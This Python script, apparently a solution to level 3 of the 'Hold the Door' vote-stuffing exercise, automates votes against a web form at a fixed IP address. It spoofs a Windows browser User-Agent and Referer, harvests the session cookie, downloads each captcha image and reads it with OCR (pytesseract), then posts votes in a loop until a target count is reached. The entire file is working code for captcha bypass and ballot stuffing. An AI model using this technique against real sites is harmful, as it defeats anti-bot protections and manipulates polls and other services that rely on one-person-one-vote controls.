#!/usr/bin/python3
"""Hodor 3
   Use: ./3.py
   The program obtain #votes current and just sending the necessary votes.
   send user windows headers
"""
import requests
import pytesseract
#from PIL import Image
import cv2

try:
    ID = int(input("Input number the ID: "))
except ValueError:
    print("PLEASE: input number integer.")
    exit(98)
try:
    votes = int(input("Input number the votes: "))
except ValueError:
    print("PLEASE: input number integer.")
    exit(98)

url = 'http://158.69.76.135/level3.php'
captcha = 'http://158.69.76.135/captcha.php'
data = {'id': str(ID), 'holdthedoor': 'Submit'}

headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
headers = {"User-Agent": headerwin, "Referer": url}
success = 'Hold the Door challenge - Level 3'
ok = 0
fail = 0
votescurrent = 0

s = requests.Session()
s.headers.update(headers)
response = s.get(url, headers=headers)

txt = response.text.split()
txtid = txt.index(str(ID))
if ((txt[txtid+3]).isdigit()):
    votescurrent = int(txt[txtid+3])


print(headers)
print("------------------------------------------------------------------")
print("Hello Alzheimeer: ID: {}, VOTES CURRENT: {}, URL: {},  \
".format(ID, votescurrent, url))
print("------------------------------------------------------------------")
print(success)
print("------------------------------------------------------------------")


for i in range(votescurrent, votes):
    response = s.get(url, headers=headers)
    key = response.cookies['HoldTheDoor']
    data["key"] = key
    cookie = {"HoldTheDoor": key}

    r = s.get(captcha, headers=headers)
    f = open('captcha.png', 'wb')
    f.write(r.content)
    f.close()

    img = cv2.imread("captcha.png")
  #  readimg = pytesseract.image_to_string(Image.open('captcha.png'))
    readimg = pytesseract.image_to_string(img)
    data["captcha"] = readimg
    response1 = s.post(url, data=data)
    if response1.status_code is 200 and success in response1.text:
        ok += 1
        print("{} Ok   ".format(ok), end='\r', flush=True)
    else:
        fail += 1
        print("{} Fail".format(fail), end='\r', flush=True)

print()
print("------------------------------------------------------------------")
print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
print("------------------------------------------------------------------")
